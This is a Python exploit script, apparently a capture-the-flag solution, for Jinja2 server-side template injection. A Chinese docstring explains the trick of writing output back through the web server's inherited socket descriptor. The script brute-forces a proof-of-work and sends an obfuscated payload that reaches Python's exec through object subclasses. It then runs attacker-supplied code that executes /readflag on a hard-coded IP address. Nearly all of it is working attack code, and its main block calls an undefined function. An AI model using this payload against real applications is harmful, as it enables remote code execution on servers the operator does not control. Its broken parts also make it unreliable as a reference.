"""
jinja2模板注入
一个大坑是执行的代码找不到可以输出的地方。
考虑到子进程继承web server的socket描述符，我们可以直接专门开一个空的HTTP连接，把消息发过去。
"""
import requests
import hashlib
import string
import re
import time
import os
import socket

sockaddr=('134.175.230.10',6000)
#base='http://192.168.142.136:80/'
base='http://134.175.230.10:6001/'
charset=string.ascii_letters + string.digits
link_re=re.compile(r'^.*?<a href="read\?filename=(.*?)">')

def getlist(s):
    res=s.get(base)
    for l in res.text.splitlines():
        mat=link_re.match(l)
        if mat:
            yield mat.group(1)

def pow(s):
    res=s.get(base+'pow')
    js=res.json()
    #print('== calc pow')
    pfx=js['text']
    tgt=js['hash']
    for a in charset:
        for b in charset:
            for c in charset:
                for d in charset:
                    work=a+b+c+d
                    if hashlib.sha256((pfx+work).encode()).hexdigest()==tgt:
                        #print('== pow ok')
                        return work
    raise RuntimeError('pow fuck')
    
def read(s,fn,w,cmd=None):
    res=s.get(base+'read',params={
        'filename': fn,
        'work': w,
        'z': cmd,
    })
    return res.text
    
def write(s,text,w):
    res=s.get(base+'write',params={
        'text': text,
        'work': w,
    })
    return res.text

s=None
def s_connect():
    global s
    s=socket.socket()
    s.connect(sockaddr)
    s.send(b'player\n')
    time.sleep(.25)
    txt=s.recv(1000).decode()
    uuid=txt.partition('\nYour UUID: ')[2].partition('\n\n')[0]
    return uuid
           
def s_upload(txt):
    if not s: return
    s.send(txt.encode()+b'\n')
    time.sleep(.25)
    
def s_close():
    global s
    if s: s.close()
    s=None
           
txt=r'''/{{'1'.__class__.mro()[-1].__subclasses__()[80].__init__.__globals__['__bu\x69ltins__']['ex\x65c'](request.args.z)}}'''

if __name__=='__main__':
      # print fd value
    work('import os\nfor i in range(20): os.fdopen(i,"w").write("ERROR%d"%i)','fd')
        #work('import os,subprocess,json\nos.fdopen(4,"w").write(json.dumps(subprocess.check_output("/readflag").decode()))','fd')
    xx = r'''
import subprocess
import os
dd=os.fdopen(4,"w")
dd.write('ERROR!')
p=subprocess.Popen(
    executable="/readflag",args=[],shell=True,
    stdout=subprocess.PIPE,stdin=subprocess.PIPE
)
try:
    s=p.stdout.readline().decode()
    s=p.stdout.readline().decode()
    s=str(eval(s))
    s=p.communicate((s+'\n').encode())[0]
    dd.write(s.decode()+'\n')
except Exception as e:
    dd.write('EXP='+repr(e))
'''
    work(xx,'out')